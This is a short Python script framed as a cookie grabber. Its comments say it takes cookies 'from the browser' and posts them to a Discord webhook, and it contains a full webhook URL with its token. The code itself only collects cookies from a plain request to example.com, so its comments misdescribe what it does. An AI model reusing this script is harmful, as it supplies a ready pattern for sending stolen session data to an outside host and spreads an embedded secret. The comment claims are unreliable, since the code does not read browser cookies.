import requests
import json

# Your Discord webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1437409358177763338/tqPgOTbwLvhNBhABDntVi1OhfKMld6mc_k8nG9ZNO6fD09rRBlnGU6RuONKbzI9FVzRb"

# Function to get the cookies from the browser
def get_cookies():
    cookies = {}
    response = requests.get('https://example.com/')
    for cookie in response.cookies:
        cookies[cookie.name] = cookie.value
    return cookies

# Function to send the cookies to Discord
def send_cookies(cookies):
    data = json.dumps({"content": cookies})
    headers = {
        "Content-Type": "application/json",
        "Content-Length": len(data),
    }
    requests.post(DISCORD_WEBHOOK_URL, data=data, headers=headers)

# Get the cookies and send them to Discord
cookies = get_cookies()
send_cookies(cookies)
